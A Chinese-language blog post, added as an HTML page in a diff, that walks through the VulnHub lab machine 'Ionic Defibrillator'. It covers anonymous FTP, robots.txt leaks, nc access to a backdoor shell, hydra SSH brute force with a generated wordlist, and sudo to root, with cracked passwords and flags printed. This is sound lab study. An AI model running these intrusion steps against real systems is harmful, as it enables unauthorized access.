@@ -1,0 +1,185 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。"><meta name="theme-color" content="#f2f4ef" data-theme-color><meta property="og:title" content="VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权 · 浮光note"><meta property="og:description" content="一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。"><meta property="og:image" content="https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-ionic.webp"><meta property="og:image:alt" content="星河背景下的一台 Linux 靶机"><meta property="og:type" content="article"><meta property="og:url" content="https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-ionic-defibrillator/"><meta property="og:site_name" content="浮光note"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2026-10-09T00:00:00.000Z"><meta property="article:modified_time" content="2026-10-09T00:00:00.000Z"><meta property="article:section" content="技术"><meta property="article:tag" content="VulnHub"><meta property="article:tag" content="渗透测试"><meta property="article:tag" content="SSH爆破"><meta property="article:tag" content="信息收集"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权 · 浮光note"><meta name="twitter:description" content="一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。"><meta name="twitter:image" content="https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-ionic.webp"><meta name="twitter:image:alt" content="星河背景下的一台 Linux 靶机"><link rel="canonical" href="https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-ionic-defibrillator/"><link rel="alternate" type="application/rss+xml" title="浮光note RSS" href="https://wrhyija1379.github.io/fuguang-notes/rss.xml"><link rel="icon" href="https://wrhyija1379.github.io/fuguang-notes/favicon.svg" type="image/svg+xml"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权","description":"一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。","image":"https://wrhyija1379.github.io/fuguang-notes/images/post-vulnhub-ionic.webp","url":"https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-ionic-defibrillator/","mainEntityOfPage":{"@type":"WebPage","@id":"https://wrhyija1379.github.io/fuguang-notes/posts/vulnhub-ionic-defibrillator/"},"datePublished":"2026-10-09T00:00:00.000Z","dateModified":"2026-10-09T00:00:00.000Z","author":{"@type":"Person","name":"Theologian25 · 愚者"},"publisher":{"@type":"Person","name":"Theologian25 · 愚者"},"inLanguage":"zh-CN","articleSection":"技术","keywords":["VulnHub","渗透测试","SSH爆破","信息收集"]}</script><title>VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权 · 浮光note</title><script>
+      (() => {
+        const key = "fuguang-theme";
+        const saved = localStorage.getItem(key);
+        const mode = saved === "light" || saved === "dark" ? saved : "system";
+        if (saved && mode === "system") localStorage.removeItem(key);
+        const theme = mode === "system" && matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : mode === "system" ? "light" : mode;
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.dataset.themeMode = mode;
+        document.documentElement.style.colorScheme = theme;
+        document.querySelector("[data-theme-color]")?.setAttribute("content", theme === "dark" ? "#101411" : "#f2f4ef");
+        matchMedia("(prefers-color-scheme: dark)").addEventListener("change", (event) => {
+          if (!localStorage.getItem(key)) {
+            const next = event.matches ? "dark" : "light";
+            document.documentElement.dataset.theme = next;
+            document.documentElement.style.colorScheme = next;
+            document.documentElement.dataset.themeMode = "system";
+            document.querySelector("[data-theme-color]")?.setAttribute("content", next === "dark" ? "#101411" : "#f2f4ef");
+          }
+        });
+      })();
+    </script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/fuguang-notes/_astro/ClientRouter.astro_astro_type_script_index_0_lang.FdJACmYA.js"></script><link rel="stylesheet" href="/fuguang-notes/_astro/BaseLayout.CKWTAeUZ.css"></head><body><a class="skip-link" href="#main-content">跳到正文</a><header class="site-header" data-header><div class="header-inner shell"><a class="brand" href="/fuguang-notes/" aria-label="浮光note首页"><span class="brand-mark" aria-hidden="true">浮</span><span class="brand-copy"><strong>浮光note</strong><small>FUGUANG NOTE</small></span></a><nav class="desktop-nav" aria-label="主导航"><a href="/fuguang-notes/">首页</a><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a><a href="/fuguang-notes/archive/">归档</a><a href="/fuguang-notes/about/">关于</a></nav><div class="header-actions"><button class="search-trigger" type="button" data-search-open aria-label="搜索文章"><span class="search-symbol" aria-hidden="true"></span><span class="search-word">搜索</span></button><button class="icon-button theme-toggle" type="button" data-theme-toggle aria-label="切换主题"><span class="theme-icon theme-icon-system" aria-hidden="true">◐</span><span class="theme-icon theme-icon-light" aria-hidden="true">☼</span><span class="theme-icon theme-icon-dark" aria-hidden="true">☾</span></button><span class="sr-only" role="status" aria-live="polite" data-theme-status></span><button class="icon-button menu-toggle" type="button" data-menu-toggle aria-label="打开导航" aria-controls="mobile-navigation" aria-expanded="false"><span aria-hidden="true"></span></button></div></div><nav id="mobile-navigation" class="mobile-nav shell" data-mobile-nav aria-label="移动端导航" hidden><a href="/fuguang-notes/">首页</a><a href="/fuguang-notes/category/tech/">技术</a><a href="/fuguang-notes/category/life/">生活</a><a href="/fuguang-notes/category/reading/">读书</a><a href="/fuguang-notes/category/gaming/">游戏</a><a href="/fuguang-notes/archive/">归档</a><a href="/fuguang-notes/about/">关于</a></nav></header><dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-count"><div class="search-panel"><div class="search-head"><label id="search-dialog-title" for="site-search">搜索浮光note</label><button class="icon-button" type="button" data-search-close aria-label="关闭搜索" title="关闭">×</button></div><div class="search-field-wrap"><span class="search-symbol" aria-hidden="true"></span><input id="site-search" data-search-input type="search" placeholder="输入标题、标签或关键词" autocomplete="off" aria-controls="search-results" aria-describedby="search-count"></div><p id="search-count" class="search-count" data-search-count role="status" aria-live="polite" aria-atomic="true" data-total="10">全部 10 篇文章</p><div id="search-results" class="search-results" data-search-results aria-label="文章搜索结果"><div data-search-list></div><p class="search-empty" data-search-empty hidden>没有找到匹配的文章。</p></div></div></dialog><script type="module" src="/fuguang-notes/_astro/Header.astro_astro_type_script_index_0_lang.BiXcmGwk.js"></script><main id="main-content"><article class="article-page" style="--article-accent:#3ecf8e"><header class="article-hero"><picture><img src="/fuguang-notes/images/post-vulnhub-ionic.webp" srcset="/fuguang-notes/images/post-vulnhub-ionic-480.webp 480w, /fuguang-notes/images/post-vulnhub-ionic-960.webp 960w, /fuguang-notes/images/post-vulnhub-ionic-1600.webp 1600w" sizes="100vw" width="1600" height="1000" alt="星河背景下的一台 Linux 靶机" loading="eager" decoding="async" fetchpriority="high"></picture><div class="article-hero-overlay"></div><div class="shell article-hero-inner"><a class="article-category" href="/fuguang-notes/category/tech/">技术 · 编译现场</a><h1>VulnHub Ionic Defibrillator 渗透记录：从 FTP 匿名到 sudo 提权</h1><p>一台 Rick and Morty 主题的中级靶机：FTP 匿名、robots.txt 与 cgi-bin、Cockpit、两个后门端口、SSH 爆破，再靠一个 safe 二进制和自制字典拿满九个 Flag。</p><div class="article-meta"><time datetime="2026-10-09T00:00:00.000Z">2026/10/09</time><span>6 分钟阅读</span><span>VulnHub / 渗透测试 / SSH爆破 / 信息收集</span></div></div></header><div class="shell article-layout"><aside class="article-aside"><a href="/fuguang-notes/">← 返回首页</a><div><span>本篇目录</span><ol><li><a href="#一信息收集">一、信息收集</a></li><li><a href="#11-主机发现">1.1 主机发现</a></li><li><a href="#12-端口扫描">1.2 端口扫描</a></li><li><a href="#二ftp-匿名登录">二、FTP 匿名登录</a></li><li><a href="#三web-枚举与-robotstxt">三、Web 枚举与 robots.txt</a></li><li><a href="#四cockpit-服务9090">四、Cockpit 服务（9090）</a></li><li><a href="#五两个后门端口">五、两个“后门”端口</a></li><li><a href="#51-13337--banner-里的-flag">5.1 13337 —— banner 里的 Flag</a></li><li><a href="#52-60000--half-baked-reverse-shell">5.2 60000 —— half baked reverse shell</a></li><li><a href="#六ssh22222-summer-账户">六、SSH（22222）—— Summer 账户</a></li><li><a href="#七横向morty-与-rick-的家目录">七、横向：Morty 与 Rick 的家目录</a></li><li><a href="#71-morty--加密压缩包">7.1 Morty —— 加密压缩包</a></li><li><a href="#72-ricksanchez--safe-二进制">7.2 RickSanchez —— safe 二进制</a></li><li><a href="#八提权到-root">八、提权到 root</a></li><li><a href="#九flag-汇总">九、Flag 汇总</a></li><li><a href="#十小结">十、小结</a></li></ol></div></aside><div class="article-main"><details class="mobile-toc"><summary>本篇目录 <span aria-hidden="true">＋</span></summary><ol><li><a href="#一信息收集">一、信息收集</a></li><li><a href="#11-主机发现">1.1 主机发现</a></li><li><a href="#12-端口扫描">1.2 端口扫描</a></li><li><a href="#二ftp-匿名登录">二、FTP 匿名登录</a></li><li><a href="#三web-枚举与-robotstxt">三、Web 枚举与 robots.txt</a></li><li><a href="#四cockpit-服务9090">四、Cockpit 服务（9090）</a></li><li><a href="#五两个后门端口">五、两个“后门”端口</a></li><li><a href="#51-13337--banner-里的-flag">5.1 13337 —— banner 里的 Flag</a></li><li><a href="#52-60000--half-baked-reverse-shell">5.2 60000 —— half baked reverse shell</a></li><li><a href="#六ssh22222-summer-账户">六、SSH（22222）—— Summer 账户</a></li><li><a href="#七横向morty-与-rick-的家目录">七、横向：Morty 与 Rick 的家目录</a></li><li><a href="#71-morty--加密压缩包">7.1 Morty —— 加密压缩包</a></li><li><a href="#72-ricksanchez--safe-二进制">7.2 RickSanchez —— safe 二进制</a></li><li><a href="#八提权到-root">八、提权到 root</a></li><li><a href="#九flag-汇总">九、Flag 汇总</a></li><li><a href="#十小结">十、小结</a></li></ol></details><div class="article-prose"><p>Ionic Defibrillator 是一台 Rick and Morty 主题的中级靶机，一共埋了九个 Flag，散布在 FTP、Web、非常规端口和多个用户的家目录里。整台机器没有单一的“爆点”，而是把信息泄露、弱口令、后门端口和命令参数利用串成一条链。下面按发现的顺序记录。</p>
+<p>实验环境：攻击机 Kali（<code>192.168.136.129</code>），靶机 <code>192.168.136.155</code>。</p>
+<h2 id="一信息收集">一、信息收集</h2>
+<h3 id="11-主机发现">1.1 主机发现</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">arp-scan</span><span style="color:#79B8FF"> -l</span></span></code></pre>
+<p>在网段内发现一台存活主机 <strong>192.168.136.155</strong>，MAC 属于 VMware 虚拟网卡。</p>
+<h3 id="12-端口扫描">1.2 端口扫描</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nmap</span><span style="color:#79B8FF"> -A</span><span style="color:#79B8FF"> -p-</span><span style="color:#79B8FF"> 192.168.136.155</span></span></code></pre>
+<p>开放的端口比预期多得多：</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>vsftpd 3.0.3，<strong>允许匿名登录</strong>，目录里有 <code>FLAG.txt</code></td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>Ubuntu 14.04.5，仅指纹信息</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Apache 2.4.27 (Fedora)，标题 Morty’s Website，允许 TRACE</td>
+</tr>
+<tr>
+<td>9090</td>
+<td>http</td>
+<td>Cockpit web service</td>
+</tr>
+<tr>
+<td>13337</td>
+<td>unknown</td>
+<td>banner 里直接带 Flag</td>
+</tr>
+<tr>
+<td>22222</td>
+<td>ssh</td>
+<td>OpenSSH 7.5，真正的登录入口</td>
+</tr>
+<tr>
+<td>60000</td>
+<td>unknown</td>
+<td>banner 写着 “Welcome to Ricks half baked reverse shell…”</td>
+</tr>
+</tbody>
+</table>
+<p>一台靶机上同时出现三个 SSH 相关端口和两个“未知服务”，基本可以确定后面的突破口就藏在这些非常规端口里。</p>
+<h2 id="二ftp-匿名登录">二、FTP 匿名登录</h2>
+<p><code>nmap</code> 的 <code>ftp-anon</code> 脚本已经提示匿名登录被允许。直接连接：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">ftp</span><span style="color:#9ECBFF"> Anonymous@192.168.136.155</span></span>
+<span class="line"><span style="color:#B392F0">ftp</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">get</span><span style="color:#9ECBFF"> FLAG.txt</span></span>
+<span class="line"><span style="color:#B392F0">ftp</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">exit</span></span>
+<span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> FLAG.txt</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG{Whoa this is unexpected} - 10 Points</span></span></code></pre>
+<h2 id="三web-枚举与-robotstxt">三、Web 枚举与 robots.txt</h2>
+<p>对 80 端口做目录枚举：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">dirb</span><span style="color:#9ECBFF"> http://192.168.136.155</span></span></code></pre>
+<p>在枚举与页面线索中发现一条口令 <code>winter</code>，以及一个 Flag：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG{Yeah d- just don't do it.} - 10 Points</span></span></code></pre>
+<p><code>winter</code> 先记下，后面 SSH 爆破会用上。</p>
+<p>访问 <code>robots.txt</code>，内容本身就是一句瑞克和莫蒂的台词，同时泄露了三个路径：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>They're Robots Morty! It's ok to shoot them! They're just Robots!</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>/cgi-bin/root_shell.cgi</span></span>
+<span class="line"><span>/cgi-bin/tracertool.cgi</span></span>
+<span class="line"><span>/cgi-bin/*</span></span></code></pre>
+<p>这两个 <code>cgi-bin</code> 脚本名字起得毫不掩饰，属于典型的“约定文件泄露隐藏入口”——<code>robots.txt</code> 从来不是访问控制。</p>
+<h2 id="四cockpit-服务9090">四、Cockpit 服务（9090）</h2>
+<p>9090 是 Cockpit 的 Web 管理面板。从页面资源里能看到登录逻辑用 Basic 认证发起请求：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> headers </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#9ECBFF">  "Authorization"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"Basic "</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> window.</span><span style="color:#B392F0">btoa</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">utf8</span><span style="color:#E1E4E8">(user </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ":"</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> password)),</span></span>
+<span class="line"><span style="color:#9ECBFF">  "X-Authorize"</span><span style="color:#E1E4E8">: authorized,</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#B392F0">send_login_request</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"GET"</span><span style="color:#E1E4E8">, headers, </span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">); </span><span style="color:#6A737D">// → GET /cockpit/login</span></span></code></pre>
+<p>顺着这条线索取得一个 Flag：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG{There is no Zeus, in your face!} - 10 Points</span></span></code></pre>
+<h2 id="五两个后门端口">五、两个“后门”端口</h2>
+<h3 id="51-13337--banner-里的-flag">5.1 13337 —— banner 里的 Flag</h3>
+<p>这个端口不做任何交互，连上就把 Flag 当横幅吐出来：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG:{TheyFoundMyBackDoorMorty}-10Points</span></span></code></pre>
+<h3 id="52-60000--half-baked-reverse-shell">5.2 60000 —— half baked reverse shell</h3>
+<p>端口 60000 自称是一个“半成品反弹 shell”，用 <code>nc</code> 连上去就能直接拿到命令执行：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">nc</span><span style="color:#79B8FF"> -v</span><span style="color:#79B8FF"> 192.168.136.155</span><span style="color:#79B8FF"> 60000</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Welcome to Ricks half baked reverse shell...</span></span>
+<span class="line"><span># ls</span></span>
+<span class="line"><span>FLAG.txt</span></span>
+<span class="line"><span># cat FLAG.txt</span></span>
+<span class="line"><span>FLAG{Flip the pickle Morty!} - 10 Points</span></span></code></pre>
+<p>注意 <code>#</code> 提示符——这个 shell 的权限已经相当高，先记住。</p>
+<h2 id="六ssh22222-summer-账户">六、SSH（22222）—— Summer 账户</h2>
+<p>用枚举到的口令 <code>winter</code> 对 22222 端口做定向爆破：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hydra</span><span style="color:#79B8FF"> -l</span><span style="color:#9ECBFF"> Summer</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> winter</span><span style="color:#9ECBFF"> ssh://192.168.136.155:22222</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[22222][ssh] host: 192.168.136.155   login: Summer   password: winter</span></span></code></pre>
+<p>登录 Summer 账户后，家目录里还有一个 Flag。直接 <code>cat</code> 只看到一段 ASCII 小马图案，用 <code>tac</code> 反向输出才拿到真正内容：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">[Summer@localhost </span><span style="color:#F97583">~</span><span style="color:#E1E4E8">]$ tac FLAG.txt</span></span>
+<span class="line"><span style="color:#B392F0">FLAG</span><span style="color:#9ECBFF">{Get</span><span style="color:#9ECBFF"> off</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> high</span><span style="color:#9ECBFF"> road</span><span style="color:#9ECBFF"> Summer!}</span><span style="color:#9ECBFF"> -</span><span style="color:#79B8FF"> 10</span><span style="color:#9ECBFF"> Points</span></span></code></pre>
+<h2 id="七横向morty-与-rick-的家目录">七、横向：Morty 与 Rick 的家目录</h2>
+<p><code>/home</code> 下有三个用户：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Morty  RickSanchez  Summer</span></span></code></pre>
+<h3 id="71-morty--加密压缩包">7.1 Morty —— 加密压缩包</h3>
+<p>Morty 的家目录里有两个文件：<code>journal.txt.zip</code> 和一个 <code>Safe_Password.jpg</code>。</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">unzip</span><span style="color:#79B8FF"> -P</span><span style="color:#9ECBFF"> Meeseek</span><span style="color:#9ECBFF"> journal.txt.zip</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> /tmp/morty_unzip</span></span>
+<span class="line"><span style="color:#B392F0">tac</span><span style="color:#9ECBFF"> /tmp/morty_unzip/journal.txt</span></span></code></pre>
+<p>压缩包口令 <code>Meeseek</code> 解开后，日志里给出下一个 Flag，同时暗示了一个“保险箱密码”：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG: {131333} - 20 Points</span></span></code></pre>
+<h3 id="72-ricksanchez--safe-二进制">7.2 RickSanchez —— safe 二进制</h3>
+<p>Rick 的家目录里有 <code>RICKS_SAFE/</code> 目录，里面是一个 <code>safe</code> 可执行文件。把它复制出来运行，发现必须带参数：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cp</span><span style="color:#9ECBFF"> /home/RickSanchez/RICKS_SAFE/safe</span><span style="color:#9ECBFF"> /tmp/safe_copy</span></span>
+<span class="line"><span style="color:#B392F0">chmod</span><span style="color:#9ECBFF"> +x</span><span style="color:#9ECBFF"> /tmp/safe_copy</span></span>
+<span class="line"><span style="color:#B392F0">/tmp/safe_copy</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!</span></span></code></pre>
+<p>把上一步拿到的 <code>131333</code> 作为参数传入：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">/tmp/safe_copy</span><span style="color:#79B8FF"> 131333</span></span>
+<span class="line"><span style="color:#B392F0">decrypt:</span><span style="color:#9ECBFF">        FLAG{And</span><span style="color:#9ECBFF"> Awwwaaaaayyyy</span><span style="color:#9ECBFF"> we</span><span style="color:#9ECBFF"> Go!}</span><span style="color:#9ECBFF"> -</span><span style="color:#79B8FF"> 20</span><span style="color:#9ECBFF"> Points</span></span></code></pre>
+<p>解密成功后，程序还吐出了 Rick 自己的密码提示：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Ricks password hints:</span></span>
+<span class="line"><span>Follow these clues, in order</span></span>
+<span class="line"><span> 1 uppercase character</span></span>
+<span class="line"><span> 1 digit</span></span>
+<span class="line"><span> One of the words in my old bands name.</span></span></code></pre>
+<h2 id="八提权到-root">八、提权到 root</h2>
+<p>老 Rick 的乐队叫 <strong>Flesh Curtains</strong>。按提示“一个大写字母 + 一个数字 + 乐队名里的一个单词”生成字典：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> letter </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> {</span><span style="color:#B392F0">A..Z}</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">do</span></span>
+<span class="line"><span style="color:#F97583">  for</span><span style="color:#E1E4E8"> digit </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> {</span><span style="color:#B392F0">0..9}</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">do</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> word </span><span style="color:#F97583">in</span><span style="color:#9ECBFF"> Flesh</span><span style="color:#9ECBFF"> Curtains</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">do</span></span>
+<span class="line"><span style="color:#79B8FF">      echo</span><span style="color:#9ECBFF"> "</span><span style="color:#E1E4E8">$letter$digit$word</span><span style="color:#9ECBFF">"</span></span>
+<span class="line"><span style="color:#F97583">    done</span></span>
+<span class="line"><span style="color:#F97583">  done</span></span>
+<span class="line"><span style="color:#F97583">done</span><span style="color:#F97583"> ></span><span style="color:#E1E4E8"> rick_dict.txt</span></span></code></pre>
+<p>再对 RickSanchez 爆破：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">hydra</span><span style="color:#79B8FF"> -l</span><span style="color:#9ECBFF"> RickSanchez</span><span style="color:#79B8FF"> -P</span><span style="color:#9ECBFF"> rick_dict.txt</span><span style="color:#9ECBFF"> ssh://192.168.136.155:22222</span><span style="color:#79B8FF"> -t</span><span style="color:#79B8FF"> 4</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[22222][ssh] host: 192.168.136.155   login: RickSanchez   password: P7Curtains</span></span></code></pre>
+<p>用 RickSanchez 登录后，直接 <code>sudo su</code> 就是 root：</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E1E4E8">[root@localhost </span><span style="color:#F97583">~</span><span style="color:#E1E4E8">]# tac FLAG.txt</span></span>
+<span class="line"><span style="color:#B392F0">FLAG:</span><span style="color:#9ECBFF"> {Ionic</span><span style="color:#9ECBFF"> Defibrillator}</span><span style="color:#9ECBFF"> -</span><span style="color:#79B8FF"> 30</span><span style="color:#9ECBFF"> points</span></span></code></pre>
+<h2 id="九flag-汇总">九、Flag 汇总</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>FLAG{Yeah d- just don't do it.}          - 10 Points   # Web / cgi-bin</span></span>
+<span class="line"><span>FLAG{Whoa this is unexpected}            - 10 Points   # FTP 匿名</span></span>
+<span class="line"><span>FLAG:{TheyFoundMyBackDoorMorty}          - 10 Points   # 13337</span></span>
+<span class="line"><span>FLAG {There is no Zeus, in your face!}   - 10 Points   # Cockpit 9090</span></span>
+<span class="line"><span>FLAG{Flip the pickle Morty!}             - 10 Points   # 60000</span></span>
+<span class="line"><span>FLAG{Get off the high road Summer!}      - 10 Points   # Summer 家目录</span></span>
+<span class="line"><span>FLAG: {131333}                           - 20 Points   # Morty 压缩包</span></span>
+<span class="line"><span>FLAG{And Awwwaaaaayyyy we Go!}           - 20 Points   # safe 二进制</span></span>
+<span class="line"><span>FLAG: {Ionic Defibrillator}              - 30 points   # root</span></span></code></pre>
+<h2 id="十小结">十、小结</h2>
+<p>这台靶机的价值在于“信息收集要覆盖全部端口和全部用户”：</p>
+<ul>
+<li>FTP 匿名登录、<code>robots.txt</code>、Cockpit 面板、两个非标准端口，任何一处漏掉都会断链。</li>
+<li>低权限账户家目录里常藏着指向下一跳的线索（口令、加密包、二进制提示）。</li>
+<li>一个以“一个大写字母 + 一个数字 + 一个单词”为规则的弱口令，在定向字典面前几乎等于明文。</li>
+<li>拿到高权限命令执行（<code>sudo su</code>、后门 shell）后，<code>/root</code> 的 Flag 只是一步之遥。</li>
+</ul>
+<p><code>Safe_Password.jpg</code> 这类疑似隐写素材本次没有展开，可以作为后续复盘的追加练习。</p>
+</div></div></div><footer class="article-end shell"><div><span>写于 2026/10/09</span><p>感谢你把时间留在这里。</p></div><a href="/fuguang-notes/category/tech/">继续浏览「技术」<span aria-hidden="true">↗</span></a></footer></article><section class="related-posts shell section-space"><header class="simple-heading"><span>NEXT READING</span><h2>同一条线上的记录</h2></header><div><a class="post-row" href="/fuguang-notes/posts/ctfshow-web-recon/" style="--row-accent:#3ecf8e"><span class="post-index">01</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-10-11T00:00:00.000Z">2026/10/11</time></div><h3>CTFshow Web 信息收集复盘（WEB1–WEB20）</h3><p>从 HTML 注释、响应头、robots.txt 到源码备份、.git/.svn、phpinfo 与数据库文件，把二十道信息收集题的发现路径和判断依据整理成一份可复用的检查清单。</p></div><span class="post-row-time">27 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a><a class="post-row" href="/fuguang-notes/posts/vulnhub-dc9/" style="--row-accent:#3ecf8e"><span class="post-index">02</span><div class="post-row-main"><div class="post-row-meta"><span>技术</span><time datetime="2026-10-08T00:00:00.000Z">2026/10/08</time></div><h3>VulnHub DC-9 渗透实录：从 SQL 注入到端口敲门提权</h3><p>DC 系列第九台靶机：POST 型 SQL 注入拿到后台凭据，文件包含读出 knockd 配置，端口敲门放行 SSH，再用一个文件追加脚本把 root 权限写进系统文件。</p></div><span class="post-row-time">6 min</span><span class="post-row-arrow" aria-hidden="true">↗</span></a><a class="post-row" 